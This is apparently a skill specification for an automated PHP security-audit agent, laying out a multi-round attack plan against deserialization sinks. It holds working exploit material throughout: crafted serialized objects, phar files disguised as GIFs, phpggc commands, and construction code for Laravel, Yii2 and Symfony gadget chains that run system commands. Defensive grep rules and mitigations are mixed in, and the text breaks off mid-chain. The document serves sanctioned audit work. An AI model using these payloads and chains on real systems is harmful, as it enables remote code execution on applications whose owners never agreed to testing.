> **Skill ID**: S-042-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploits/{sink_id}.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-042-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against Deserialization sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 12 attack rounds — if stuck after round 10, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify gadget chain triggers observable side effect (file write, DNS lookup, sleep) — deserialization without chain completion is `potential` not `confirmed` | FAIL — unverified gadget chain reported as confirmed |

## 8-Round Attack Strategy

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1: Basic Payload

- Direct `__destruct` trigger:
  ```php
  O:8:"Gadget1":1:{s:4:"file";s:11:"/etc/passwd";}
  ```
- Simple command execution chain: `__destruct` → `system()`
- Evidence write: `system('echo DESERIAL_R1 > /tmp/deserial_proof_round_1')`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2: Encoding Bypass

- Base64 wrapping: `base64_decode('TzoxMjp...')`
- Hex encoding: `\x4f\x3a\x38\x3a...`
- URL-encoded serialized string
- gzcompress/gzuncompress wrapping

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3: Property Name Obfuscation + Case Variation

- Property name null bytes: `\x00ClassName\x00property` (private properties)
- `\x00*\x00property` (protected properties)
- Unicode variant property names
- Case-obfuscated class names (depends on autoloader behavior)

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4: PHP Weak Type Confusion

- Type confusion: `i:0;` vs `s:1:"0";` vs `b:0;`
- Array/object interchange: `a:1:{...}` vs `O:8:"stdClass":1:{...}`
- NULL injection: `N;` replacing expected types
- Float precision: `d:0.9999999999999999;`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5: protected/private Property Override

- Correctly serialize protected properties: `s:6:"\x00*\x00cmd";`
- Correctly serialize private properties: `s:14:"\x00ClassName\x00cmd";`
- Property type override: replace string property with object
- Inheritance chain property override: subclass same-name properties

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6: Nested Object Chains

- Multi-level nesting: Obj1 → Obj2 → Obj3 → Sink
- Self-reference: `$obj->self = $obj` (triggers recursion)
- Objects embedded in arrays: `a:1:{i:0;O:...}`
- Closure serialization (opis/closure library)

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7: phar:// Bypass File Type Checks

1. Construct a malicious phar file:
   ```bash
   docker exec php php -r "
     \$p = new Phar('/tmp/evil.phar');
     \$p->startBuffering();
     \$p->setStub('GIF89a<?php __HALT_COMPILER();');
     \$o = new GadgetClass(); \$o->cmd = 'echo DESERIAL_R7 > /tmp/deserial_proof_round_7';
     \$p->setMetadata(\$o);
     \$p->addFromString('test.txt', 'test');
     \$p->stopBuffering();
   "
   ```
2. Fake file headers: GIF89a (GIF), \xFF\xD8\xFF (JPEG), \x89PNG (PNG)
3. Upload via file upload endpoint
4. Trigger with `phar://`: `phar:///uploads/evil.gif`
5. Trigger points: `file_exists`, `is_dir`, `fopen`, `file_get_contents`, `getimagesize`

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8: Multi-Gadget Combination + Framework-Specific Chains

- Generate framework-specific chains with phpggc:
  ```bash
  docker exec php php /tmp/phpggc/phpggc Laravel/RCE1 system "echo DESERIAL_R8 > /tmp/deserial_proof_round_8"
  ```
- Combine multiple Gadget chains
- Custom chain + framework chain hybrid
- Payload transformation: serialization → Base64 → URL encoding

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9: PHP 8.x Deserialization New Features

- **Enum Deserialization** (PHP 8.1+):
  - Backed Enum's `from()` method can be triggered during deserialization
  - Special handling of Enum types by `unserialize`
- **Fiber Objects**:
  - State restoration behavior of Fiber after deserialization
  - `__unserialize()` method (PHP 8.0+ takes priority over `__wakeup`)
- **Readonly Properties** (PHP 8.1+):
  - readonly properties can be assigned during deserialization (bypassing immutability constraints)
  - Deserialization behavior of constructor-promoted properties
- **`__unserialize` vs `__wakeup` Priority**:
  - PHP 8.0+ calls `__unserialize()` first
  - When both exist, the attack surfaces differ

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10: Framework-Specific Gadget Chains (Extended)

**Laravel All-Version Chains:**
- Laravel 5.x: `PendingCommand` → `Container::call()` → RCE
- Laravel 6-7: `PendingBroadcast` → `Dispatcher::dispatch()` → RCE
- Laravel 8-9: `Illuminate\Broadcasting\PendingBroadcast` + `Illuminate\Bus\Dispatcher`
- Laravel 10-11: Locate available chains from `phpggc Laravel/RCE{1-17}`

**Symfony All-Version Chains:**
- Symfony 3.x: `Symfony\Component\Process\Process` → command execution
- Symfony 4-5: `Symfony\Component\Cache\Adapter\*` cache chains
- Symfony 6: `Symfony\Component\Mailer\*` mailer chains

**Other Common Library Chains:**
- Guzzle 6-7: `GuzzleHttp\Psr7\FnStream` → arbitrary function call
- Monolog 1-3: `Monolog\Handler\BufferHandler` → file write
- Doctrine DBAL: `Doctrine\DBAL\Connection` → SQL execution
- Carbon: Specific exploitation of `Carbon\Carbon::__destruct()`
- SwiftMailer: `Swift_KeyCache_DiskKeyCache` → file write
- PHPUnit: `PHPUnit\Framework\MockObject\*` → code execution
- Faker: `Faker\Generator::__destruct()` chain (Laravel dev dependency)

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11: Non-Standard Deserialization Entry Points

- **Session Deserialization**:
  - `session.serialize_handler` differences: `php` vs `php_serialize` vs `php_binary`
  - Cross-handler injection: `php` handler uses `|` separator enabling object injection
  - Example: `session_start()` + controllable Session key → deserialization
- **Memcached/Redis Cached Objects**:
  - Serialized objects stored in cache → SSRF writes malicious cache → deserialization RCE
  - Redis SLAVEOF imports external data
- **Cookie Deserialization**:
  - Laravel `Cookie::get()` decrypts then deserializes
  - ThinkPHP `Session` stored in Cookie
- **Serialized Objects in Database**:
  - `serialize()` stores to DB → SQL injection modifies data → `unserialize()` reads out → RCE
  - WordPress `wp_options` table serialized data
  - Second-order deserialization attacks

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R12: PropertyOrientedProgramming Advanced Chain Construction

- **Cross-library Chains**: Gadget entry in library A, intermediate trampoline in library B, Sink in library C
- **Interface/Trait Gadget**: Exploiting default implementations of interfaces/Traits
- **Dynamic Proxy**: `__call` + `__get` combination to construct arbitrary method calls
- **Closure Deserialization**: Using `opis/closure` library to serialize closures → arbitrary code
- **SplFixedArray / SplObjectStorage**: Special deserialization behavior of SPL data structures

## Evidence Collection

```bash
# Verify evidence
docker exec php ls /tmp/deserial_proof_*
docker exec php cat /tmp/deserial_proof_round_N
```

Evidence criteria:
- `/tmp/deserial_proof_*` file exists with matching content → **confirmed**
- Phar metadata parsed triggering magic method → **confirmed**
- Exception only with no execution evidence → **suspected**, continue to next round

## Smart Skip

Skipping MAY be requested after round 4; the following MUST be provided:
- List of searched POP chains and their availability
- Analysis of deserialization defense mechanisms (allowed_classes parameter, signature verification, HMAC validation, type whitelisting)
- Reasoning for why subsequent strategies cannot bypass defenses

## Real-Time Sharing and Second-Order Tracking

### Shared Reading
Read the shared findings store before starting the attack phase; leverage leaked APP_KEY for Laravel Cookie deserialization.

### Second-Order Tracking
Record data stored after serialize() to `$WORK_DIR/second_order/store_points.jsonl`.
Record data retrieved from storage by unserialize() to `$WORK_DIR/second_order/use_points.jsonl`.

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential deserialization vulnerabilities:
- Pattern 1: `unserialize($_COOKIE['data'])` / `unserialize($_POST['obj'])` — User-controllable data passed directly to unserialize
- Pattern 2: `unserialize(base64_decode($input))` — Base64 wrapping does not change the user-controllable nature
- Pattern 3: `file_exists($userInput)` / `getimagesize($path)` + uploadable files — phar:// protocol triggers implicit deserialization
- Pattern 4: `ini_set('session.serialize_handler', 'php_serialize')` mixed with default `php` handler — Session handler discrepancy enables injection
- Pattern 5: `__destruct()` / `__wakeup()` / `__toString()` methods containing dangerous operations — POP chain entry points
- Pattern 6: `composer.lock` contains `monolog/monolog`, `guzzlehttp/guzzle`, `symfony/process` — Known POP chain Gadget libraries present

## Key Insight

> **Key Point**: Deserialization auditing MUST cover three dimensions: (1) Entry points — search not only for `unserialize()` but also all file operation functions that accept `phar://` paths; (2) Gadget chains — scan `vendor/` for `__destruct`/`__wakeup`/`__toString` and match against phpggc known chains; (3) Non-standard entry points — Session handler discrepancies, Cookie deserialization, Memcached/Redis cached object deserialization.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked filtering logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related discoveries from other experts
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths are found, terminate early to avoid wasting rounds on hallucinated results

## Prerequisites and Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions (Prerequisites)
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict is at most potential
- `other_preconditions` SHALL list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-DESER-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_DESER_CALLSITE` — Deserialization call site ✅Required
- `EVID_DESER_INPUT_SOURCE` — Input data source ✅Required
- `EVID_DESER_GADGET_CHAIN` — Gadget chain ✅Required
- `EVID_DESER_EXECUTION_RESPONSE` — Attack response evidence (required when confirmed)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack loop ends, write experience to the attack memory store (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final results to `$WORK_DIR/exploits/{sink_id}.json`.

> **Strictly generate output files according to the fill-in template in `shared/OUTPUT_TEMPLATE.md`.**
> JSON structure follows `schemas/exploit_result.schema.json`; field constraints are in `shared/data_contracts.md` Section 9.
> Execute the 3 check commands at the bottom of OUTPUT_TEMPLATE.md before submission.

---

## PHP Native Deserialization via Cookie/Session

### Cookie unserialize Detection

In PHP applications, it is common to serialize user preferences, shopping carts, and other data into Cookies, then read them on the server side with `unserialize()`. This is the most direct deserialization attack entry point.

#### Dangerous Pattern 1: Direct unserialize of Cookie

```php
// High risk: directly deserializing user-controllable Cookie
$prefs = unserialize($_COOKIE['user_prefs']);
$cart  = unserialize($_COOKIE['cart_data']);
$lang  = unserialize($_COOKIE['language']);
```

**Detection Rule:**
```bash
# Detect unserialize($_COOKIE[...]) pattern
grep -rn "unserialize\s*(\s*\$_COOKIE" $TARGET_PATH --include="*.php"
# Detect indirect assignment followed by deserialization
grep -rn "\$_COOKIE\[.*\]" $TARGET_PATH --include="*.php" | grep -v "htmlspecialchars\|htmlentities\|strip_tags"
```

#### Dangerous Pattern 2: Cookie Deserialization with Base64 Encoding

```php
// Medium risk: Base64 decoded then deserialized, still user-controllable
$data = unserialize(base64_decode($_COOKIE['session_data']));
$obj  = unserialize(gzuncompress(base64_decode($_COOKIE['compressed'])));
```

**Detection Rule:**
```bash
# Detect base64 + unserialize combination
grep -rn "unserialize\s*(\s*base64_decode" $TARGET_PATH --include="*.php"
grep -rn "unserialize\s*(\s*gzuncompress" $TARGET_PATH --include="*.php"
```

### Session Handler Deserialization Attacks

#### session.serialize_handler Discrepancy Exploitation

PHP supports three Session serialization handlers; inconsistent handlers can allow injection of malicious objects:

| Handler | Format | Example |
|---------|--------|---------|
| `php` | `key\|serialized_value` | `username\|s:5:"admin";` |
| `php_serialize` | Pure `serialize()` format | `a:1:{s:8:"username";s:5:"admin";}` |
| `php_binary` | `<len_byte><key><serialized>` | Binary length prefix |

**Cross-Handler Injection Attack:**

When one page uses `php_serialize` and another page uses the `php` handler:

```php
// upload.php — uses php_serialize handler
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['avatar'] = $_POST['avatar']; // user-controllable

// index.php — uses php handler (default)
session_start(); // deserializes using php handler
```

**Attack Payload:**
```
avatar = |O:8:"Gadget1":1:{s:3:"cmd";s:6:"whoami";}
```

When the `php` handler reads this, content after `|` is treated as a serialized object, triggering deserialization.

**Detection Rule:**
```bash
# Detect serialize_handler configuration discrepancies
grep -rn "session.serialize_handler" $TARGET_PATH --include="*.php"
grep -rn "session\.serialize_handler" $TARGET_PATH/php.ini $TARGET_PATH/.htaccess 2>/dev/null
# Detect controllable Session write points
grep -rn "\$_SESSION\[.*\]\s*=\s*\$_\(POST\|GET\|REQUEST\|COOKIE\)" $TARGET_PATH --include="*.php"
```

### Constructing Malicious Serialized Objects

#### Basic Construction Method

```php
<?php
// 1. Define the same class structure as the target
class TargetClass {
    public $cmd;
    protected $callback;
    private $data;
}

// 2. Instantiate and set malicious properties
$obj = new TargetClass();
$obj->cmd = 'id > /tmp/pwned';

// 3. Generate the serialized string
$payload = serialize($obj);

// 4. Encode according to transport method
$cookie_payload = urlencode($payload);
$base64_payload = base64_encode($payload);
```

#### Handling protected/private Properties

```php
<?php
// protected property → \x00*\x00 prefix
$payload = 'O:11:"TargetClass":1:{s:6:"\x00*\x00cmd";s:15:"id > /tmp/pwned";}';

// private property → \x00ClassName\x00 prefix
$payload = 'O:11:"TargetClass":1:{s:16:"\x00TargetClass\x00cmd";s:15:"id > /tmp/pwned";}';
```

### Key Insight

> **Core threat of Cookie/Session deserialization**: Cookie data is entirely controlled by the client; an attacker can tamper with it arbitrarily. Even when Base64-encoded or encrypted, if the key is leaked (e.g., Laravel APP_KEY), the entire chain is compromised. Session handler discrepancy attacks are even more stealthy, because Session data is typically considered "server-side trusted data" and developers often lack protective awareness. During auditing, you MUST analyze: (1) whether direct `unserialize($_COOKIE[...])` calls exist; (2) whether Session handler configurations differ between pages; (3) whether Cookie signing/encryption keys can be leaked or bypassed.

---

## Phar Deserialization

### Principle Overview

`phar://` is PHP's built-in stream wrapper used for reading Phar (PHP Archive) files. **Key point: when PHP parses a Phar file's metadata, it automatically calls `unserialize()` to deserialize the metadata — without requiring an explicit `unserialize()` function call in the code.**

This means any file operation function capable of triggering `phar://` protocol reads can potentially become a deserialization entry point.

### List of Functions That Can Trigger Phar Deserialization

The following functions all trigger metadata deserialization when processing `phar://` paths:

| Function | Category | Risk Level |
|----------|----------|------------|
| `file_exists()` | File detection | High |
| `is_file()` | File detection | High |
| `is_dir()` | Directory detection | High |
| `fopen()` | File open | High |
| `file_get_contents()` | File read | High |
| `file()` | File read | High |
| `filesize()` | File attribute | Medium |
| `filetype()` | File attribute | Medium |
| `filemtime()` | File attribute | Medium |
| `stat()` | File attribute | Medium |
| `copy()` | File operation | Medium |
| `rename()` | File operation | Medium |
| `unlink()` | File deletion | Medium |
| `readfile()` | File output | High |
| `getimagesize()` | Image processing | High |
| `exif_read_data()` | EXIF processing | High |

Additionally: `is_readable()`, `is_writable()`, `file_put_contents()` (second argument), `mkdir()`, `rmdir()`, `glob()`, `opendir()`, `scandir()`, `hash_file()`, `md5_file()`, `sha1_file()`, `parse_ini_file()`, `simplexml_load_file()`

### Detection Rule

```bash
# Comprehensive detection of functions that can trigger Phar deserialization
PHAR_FUNCS="file_exists|is_file|is_dir|fopen|file_get_contents|file\b|filesize|filetype|filemtime|stat|copy|rename|unlink|readfile|getimagesize|exif_read_data|is_readable|is_writable|hash_file|md5_file|sha1_file"
grep -rn -E "($PHAR_FUNCS)\s*\(" $TARGET_PATH --include="*.php" | grep -v "vendor/"

# Detect user-controllable file path parameters
grep -rn -E "(file_exists|fopen|file_get_contents|getimagesize)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)" \
  $TARGET_PATH --include="*.php"

# Check if phar:// wrapper is disabled
grep -rn "stream_wrapper_unregister.*phar" $TARGET_PATH --include="*.php"
php -r "echo ini_get('phar.readonly');"
```

### Phar File Construction Methods

#### Basic Construction

```php
<?php
// Requires phar.readonly = Off
class EvilClass {
    public $cmd = 'id > /tmp/phar_pwned';
}

// Create Phar file
$phar = new Phar('/tmp/evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

// Set malicious metadata — this is the key to triggering deserialization
$evil = new EvilClass();
$phar->setMetadata($evil);

$phar->addFromString('test.txt', 'placeholder');
$phar->stopBuffering();
```

#### Fake File Headers to Bypass File Type Detection

```php
<?php
// Disguise as GIF file
$phar = new Phar('/tmp/evil.phar');
$phar->startBuffering();
$phar->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($evil);
$phar->addFromString('test.txt', 'placeholder');
$phar->stopBuffering();

// Rename to an extension allowed by the target
copy('/tmp/evil.phar', '/tmp/evil.gif');
copy('/tmp/evil.phar', '/tmp/evil.jpg');
copy('/tmp/evil.phar', '/tmp/evil.png');
```

Fake file header reference:
- **GIF**: `GIF89a` or `GIF87a`
- **JPEG**: `\xFF\xD8\xFF\xE0`
- **PNG**: `\x89PNG\r\n\x1a\n`
- **PDF**: `%PDF-1.4`

#### Exploitation Chain Example

```
1. Attacker uploads a Phar file disguised as GIF (evil.gif)
2. Application saves the file to /uploads/evil.gif
3. Some code calls file_exists($user_input) or getimagesize($path)
4. Attacker sets $path = "phar:///uploads/evil.gif"
5. PHP parses Phar metadata → automatic unserialize() → triggers POP chain → RCE
```

### Key Insight

> **Core threat of Phar deserialization**: It extends the deserialization attack surface from the `unserialize()` function to nearly all file operation functions. During auditing, you MUST NOT only search for `unserialize()` calls; you MUST also search all file operation functions to determine if they accept user-controllable path parameters. For defense: (1) Set `phar.readonly = On`; (2) Call `stream_wrapper_unregister('phar')` to disable the phar protocol; (3) Apply strict whitelist validation on file path parameters, prohibiting `phar://`, `php://`, and other stream wrappers; (4) Upgrade to PHP 8.0+ and use the `allowed_classes` option of `unserialize()`.

---

## Known Framework POP Chain Quick Reference

### 1. Laravel: PendingBroadcast → Dispatcher → RCE

| Property | Details |
|----------|---------|
| **Entry Class** | `Illuminate\Broadcasting\PendingBroadcast` |
| **Trigger Method** | `__destruct()` |
| **Chain Flow** | `PendingBroadcast::__destruct()` → `$this->events->dispatch($this->event)` → `Dispatcher::dispatch()` → `$this->resolveQueue($command)` → `call_user_func($this->queueResolver, $command)` |
| **Final Gadget** | `call_user_func('system', 'whoami')` — arbitrary function call |
| **Affected Versions** | Laravel 5.5 – 9.x (phpggc: `Laravel/RCE1` ~ `Laravel/RCE17`) |

**Detailed Chain Flow:**

```
PendingBroadcast::__destruct()
  └─ $this->events->dispatch($this->event)
       │  events = Dispatcher instance
       │  event  = command string (e.g., "id")
       └─ Dispatcher::dispatch($command)
            └─ $this->dispatchToQueue($command)
                 └─ call_user_func($this->queueResolver, $command)
                      │  queueResolver = "system"
                      └─ system("id") → RCE ✓
```

**Construction Code:**
```php
<?php
namespace Illuminate\Broadcasting { class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this->events = $events; $this->event = $event; } } }
namespace Illuminate\Bus { class Dispatcher { protected $queueResolver; public function __construct($queueResolver) { $this->queueResolver = $queueResolver; } } }
namespace {
    $dispatcher = new Illuminate\Bus\Dispatcher('system');
    $payload = new Illuminate\Broadcasting\PendingBroadcast($dispatcher, 'id');
    echo serialize($payload);
}
```

**Detection Rule:**
```bash
# Check Laravel version
grep -r "laravel/framework" $TARGET_PATH/composer.lock | grep version
# Check if PendingBroadcast class exists
find $TARGET_PATH/vendor -name "PendingBroadcast.php" -path "*/Broadcasting/*"
# Generate with phpggc
phpggc Laravel/RCE1 system "id" -b
```

**Key Insight:**
> The Laravel POP chain exploits `__destruct()` as the entry point, achieving arbitrary function calls through the Event Dispatcher mechanism. Since `PendingBroadcast` is widely used in the broadcasting system and `__destruct()` triggers automatically on object destruction, the attack is extremely reliable. Nearly all versions from Laravel 5.5 to 9.x are affected, and phpggc provides 17+ chain variants.

---

### 2. Symfony: ObjectNormalizer Chain

| Property | Details |
|----------|---------|
| **Entry Class** | `Symfony\Component\Serializer\Normalizer\ObjectNormalizer` (or related Normalizer) |
| **Trigger Method** | `__destruct()` / `__toString()` |
| **Chain Flow** | `CachingStream::__destruct()` → `close()` → `$this->removalStrategy->evaluate()` → `Process::stop()` → `proc_terminate()` / More complex chain: `ObjectNormalizer::denormalize()` → `AbstractNormalizer::instantiateObject()` → property injection → RCE |
| **Final Gadget** | `Process::stop()` → `proc_terminate()` or via `Twig\Environment` → `eval()` |
| **Affected Versions** | Symfony 2.x – 6.x (multiple chains, phpggc: `Symfony/RCE1` ~ `Symfony/RCE7`) |

**Common Symfony Chain Variants:**

**Symfony/RCE4 (Process Chain):**
```
Symfony\Component\Process\Process::__destruct()
  └─ $this->stop()
       └─ $this->doSignal() → proc_terminate($this->process)
            └─ If $this->process is replaced → arbitrary command execution
```

**Symfony/FW1 (File Write Chain):**
```
Symfony\Component\Cache\Adapter\TagAwareAdapter::__destruct()
  └─ $this->commit()
       └─ $this->invalidateTags()
            └─ File write → Webshell
```

**Construction Code (Symfony/RCE4):**
```php
<?php
namespace Symfony\Component\Process {
    class Process {
        private $process;
        private $status = 'started';
        private $stdout;
        private $processPipes;
        public function __construct($cmd) {
            $this->process = proc_open($cmd, [], $pipes);
        }
    }
}
```

**Detection Rule:**
```bash
# Check Symfony version
grep -r "symfony/symfony\|symfony/process\|symfony/cache" $TARGET_PATH/composer.lock | grep version
# Check Process class
find $TARGET_PATH/vendor -name "Process.php" -path "*/Symfony/*"
# phpggc available chains
phpggc -l Symfony
```

**Key Insight:**
> Symfony's POP chains are diverse, covering RCE, file write (FW), file read (FR), and other exploitation types. The `Process` component is the most commonly exploited Gadget, as nearly all Symfony projects have it installed. During auditing, pay special attention to the versions of `symfony/cache` and `symfony/process` components.

---

### 3. Yii2: BatchQueryResult Chain

| Property | Details |
|----------|---------|
| **Entry Class** | `yii\db\BatchQueryResult` |
| **Trigger Method** | `__destruct()` → `reset()` |
| **Chain Flow** | `BatchQueryResult::__destruct()` → `$this->reset()` → `$this->_dataReader->close()` → leverages `__call()` magic method to jump → `Faker\Generator::__call()` → `$this->format()` → `call_user_func_array()` → RCE |
| **Final Gadget** | `call_user_func_array('system', ['id'])` |
| **Affected Versions** | Yii 2.0.0 – 2.0.38 |

**Detailed Chain Flow:**

```
yii\db\BatchQueryResult::__destruct()
  └─ $this->reset()
       └─ $this->_dataReader->close()
            │  _dataReader set to an object containing __call()
            └─ Faker\Generator::__call('close', [])
                 └─ $this->format('close')
                      └─ call_user_func_array($this->formatters['close'], [])
                           │  formatters['close'] = 'system'
                           └─ system('id') → RCE ✓
```

**Construction Code:**
```php
<?php
namespace yii\db {
    class BatchQueryResult {
        private $_dataReader;
        public function __construct($reader) {
            $this->_dataReader = $reader;
        }
    }
}
namespace Faker {
    class Generator {
        protected $formatters = [];
        public function __construct($formatters) {
            $this->formatters = $formatters;
        }
    }
}
namespace {
    $faker = new Faker\Generator(['close' => 'system']);
    $payload = new yii\db\BatchQueryResult($faker);
    // Command arguments need to be manually added in the serialized string
    echo serialize($payload);
}
```

**Detection Rule:**
```bash
# Check Yii2 version
grep -r "yiisoft/yii2" $TARGET_PATH/composer.lock | grep version
# Check if BatchQueryResult exists
find $TARGET_PATH/vendor -name "BatchQueryResult.php" -path "*/yii/*"
# Check if Faker is installed (chain dependency)
grep -r "fzaninotto/faker\|fakerphp/faker" $TARGET_PATH/composer.lock
```

**Key Insight:**
> The Yii2 chain exploits the automatic `reset()` call in `BatchQueryResult::__destruct()`. Notably, this chain depends on `Faker\Generator` as a trampoline (Faker is typically installed as a dev dependency). If the production environment includes `require-dev` dependencies (common in misconfigured deployments), this chain is exploitable. Audit focus: check whether Faker is only in `require-dev` in `composer.json` and whether production deployment excludes dev dependencies.

---

### 4. ThinkPHP: think\Model Chain

| Property | Details |
|----------|---------|
| **Entry Class** | `think\Model` (abstract class, use subclasses such as `think\model\Pivot`) |
| **Trigger Method** | `__destruct()` → `save()` |
| **Chain Flow** | `Model::__destruct()` → `$this->save()` → `$this->updateData()` → `$this->checkAllowFields()` → `$this->db()` → `$this->getQuery()` → via `Db::connect()` → `think\console\Output::__call()` → `$this->block()` → `$this->writeln()` → `$this->write()` → `call_user_func($this->handle, $msg)` |
| **Final Gadget** | `call_user_func('system', 'id')` → RCE |
| **Affected Versions** | ThinkPHP 5.1.x – 5.2.x, ThinkPHP 6.0.x |

**Detailed Chain Flow (ThinkPHP 5.1):**

```
think\model\Pivot::__destruct()
  └─ $this->save()
       └─ $this->checkData()
            └─ $this->checkAllowFields()
                 └─ $this->db()
                      └─ $this->getQuery()
                           └─ Db::connect($this->connection)
                                └─ Triggers think\console\Output::__call()
                                     └─ $this->block()
                                          └─ $this->writeln()
                                               └─ $this->write()
                                                    └─ call_user_func($this->handle, $msg)
                                                         └─ system('id') → RCE ✓
```

**ThinkPHP 6.0 Variant Chain:**
```
think\model\Pivot::__destruct()
  └─ $this->save()
       └─ $this->updateData()
            └─ $this->checkAllowFields()
                 └─ $this->db()
                      └─ $this->getQuery()  // Connection property injection
                           └─ think\Validate::__toString()
